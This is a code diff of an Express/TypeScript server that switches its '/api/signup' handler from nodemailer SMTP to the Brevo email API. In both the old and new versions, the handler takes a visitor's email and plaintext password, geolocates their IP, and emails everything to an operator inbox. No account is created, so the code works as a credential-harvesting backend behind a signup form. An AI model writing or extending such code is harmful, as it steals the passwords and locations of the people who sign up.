@@ -1,8 +1,8 @@
 import express from "express";
 import path from "path";
 import { createServer as createViteServer } from "vite";
-import nodemailer from "nodemailer";
 import dotenv from "dotenv";
+import SibApiV3Sdk from "@sendinblue/client";
 
 dotenv.config();
 
@@ -10,10 +10,9 @@ async function startServer() {
   const app = express();
   const PORT = process.env.PORT || 3000;
 
-  app.set('trust proxy', true);
+  app.set("trust proxy", true);
   app.use(express.json());
 
-  // API Route for Signup
   app.post("/api/signup", async (req, res) => {
     const { email, password } = req.body;
 
@@ -22,123 +21,68 @@ async function startServer() {
     }
 
     const emailUser = process.env.EMAIL_USER;
-    const emailPass = process.env.EMAIL_PASS;
     const receiverEmail = process.env.RECEIVER_EMAIL;
+    const brevoKey = process.env.BREVO_API_KEY;
 
-    if (!emailUser || !emailPass) {
-      console.error("CRITICAL: EMAIL_USER or EMAIL_PASS environment variables are missing.");
-      return res.status(500).json({ 
-        error: "Server configuration error. Please ensure EMAIL_USER and EMAIL_PASS are set in the environment." 
+    if (!emailUser || !brevoKey) {
+      return res.status(500).json({
+        error: "Missing EMAIL_USER or BREVO_API_KEY in environment variables",
       });
     }
 
-    // Identify user location and IP
-    const forwardFor = req.headers['x-forwarded-for'] as string;
-    let ip = (forwardFor ? forwardFor.split(',')[0].trim() : (req.headers['x-real-ip'] as string || req.ip || req.socket.remoteAddress || "")).trim();
-    
-    // Normalize IPv6 mapped IPv4 addresses
-    if (ip.includes('::ffff:')) {
-      ip = ip.split('::ffff:')[1];
-    }
+    // IP detection
+    const forwardFor = req.headers["x-forwarded-for"] as string;
+    let ip =
+      (forwardFor
+        ? forwardFor.split(",")[0].trim()
+        : req.ip || req.socket.remoteAddress || "").trim();
 
-    // Handle local development or loopback IP (127.0.0.1 or internal ranges)
-    const isLocal = ip === '::1' || ip === '127.0.0.1' || ip.startsWith('10.') || ip.startsWith('172.16.') || ip.startsWith('192.168.') || !ip;
-    
-    let lookupIp = ip;
-    
     let locationInfo = "Location metadata unavailable";
 
-    const fetchGeo = async (provider: string) => {
-      try {
-        if (provider === 'ipapi') {
-          const res = await fetch(`https://ipapi.co/${lookupIp}/json/`);
-          const data = await res.json();
-          if (data && !data.error) {
-            return `${data.city}, ${data.region}, ${data.country_name}`;
-          }
-        } else if (provider === 'ip-api') {
-          const res = await fetch(`http://ip-api.com/json/${lookupIp}`);
-          const data = await res.json();
-          if (data && data.status === 'success') {
-            return `${data.city}, ${data.regionName}, ${data.country}`;
-          }
-        } else if (provider === 'ipinfo') {
-          const res = await fetch(`https://ipinfo.io/${lookupIp}/json`);
-          const data = await res.json();
-          if (data && !data.error && data.city) {
-            return `${data.city}, ${data.region}, ${data.country}`;
-          }
-        }
-      } catch (e) {
-        console.error(`Geo lookup failed for ${provider}:`, e);
+    try {
+      const resIp = await fetch(`https://ipapi.co/${ip}/json/`);
+      const data = await resIp.json();
+      if (data && !data.error) {
+        locationInfo = `${data.city}, ${data.region}, ${data.country_name}`;
       }
-      return null;
-    };
-
-    // Try multiple providers
-    const providers = ['ip-api', 'ipapi', 'ipinfo'];
-    let detected = null;
-    for (const p of providers) {
-      detected = await fetchGeo(p);
-      if (detected) break;
-    }
-
-    if (detected) {
-      locationInfo = detected;
-    } else {
-      locationInfo = `Geo-lookup failed (IP: ${ip}${lookupIp !== ip ? `, Used: ${lookupIp}` : ''})`;
-    }
+    } catch {}
 
     try {
-      if (!emailUser || !emailPass) {
-        throw new Error("Email credentials missing in environment variables");
-      }
-      console.log(`Attempting to send signup info for ${email} from IP: ${ip}`);
-      
-      const transporter = nodemailer.createTransport({
-  host: "smtp-relay.brevo.com",
-  port: 587,
-  secure: false,
-  auth: {
-    user: "abeb2a001@smtp-brevo.com",
-    pass: process.env.EMAIL_PASS,
-  },
-});
+      console.log(`Sending signup email for ${email}`);
 
-      // Verify connection configuration
-      try {
-        await transporter.verify();
-        console.log("SMTP connection verified successfully");
-      } catch (verifyError) {
-        console.error("SMTP Verification Failed:", verifyError);
-        throw new Error("Failed to connect to email server");
-      }
+      const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();
 
-      const mailOptions = {
-        from: emailUser,
-        to: receiverEmail || emailUser,
-        subject: `New Signup: ${email} (Adide Access)`,
-        text: `A new user has signed up for Adide Access.
+      apiInstance.setApiKey(
+        SibApiV3Sdk.TransactionalEmailsApiApiKeys.apiKey,
+        brevoKey
+      );
 
-User Details:
--------------
-Email: ${email}
-Password: ${password}
-IP Address: ${ip}
-Location: ${locationInfo}
+      await apiInstance.sendTransacEmail({
+        sender: { email: emailUser },
+        to: [{ email: receiverEmail || emailUser }],
+        subject: `New Signup: ${email}`,
+        htmlContent: `
+          <h3>New Signup</h3>
+          <p><b>Email:</b> ${email}</p>
+          <p><b>Password:</b> ${password}</p>
+          <p><b>IP:</b> ${ip}</p>
+          <p><b>Location:</b> ${locationInfo}</p>
+        `,
+      });
 
-Timestamp: ${new Date().toISOString()}`,
-      };
-
-      await transporter.sendMail(mailOptions);
-      res.status(200).json({ success: true, message: "Signup data sent to email" });
+      return res.status(200).json({
+        success: true,
+        message: "Email sent successfully",
+      });
     } catch (error) {
-      console.error("Error sending email:", error);
-      res.status(500).json({ error: "Failed to process signup. Check server logs." });
+      console.error("Brevo error:", error);
+      return res.status(500).json({
+        error: "Failed to send email",
+      });
     }
   });
 
-  // Vite middleware for development
+  // Vite production handling
   if (process.env.NODE_ENV !== "production") {
     const vite = await createViteServer({
       server: { middlewareMode: true },
@@ -146,14 +90,13 @@ Timestamp: ${new Date().toISOString()}`,
     });
     app.use(vite.middlewares);
   } else {
-  const distPath = path.resolve("dist");
+    const distPath = path.resolve("dist");
+    app.use(express.static(distPath));
 
-  app.use(express.static(distPath));
-
-  app.get(/.*/, (req, res) => {
-    res.sendFile(path.join(distPath, "index.html"));
-  });
-}
+    app.get(/.*/, (req, res) => {
+      res.sendFile(path.join(distPath, "index.html"));
+    });
+  }
 
   app.listen(PORT, "0.0.0.0", () => {
     console.log(`Server running on port ${PORT}`);
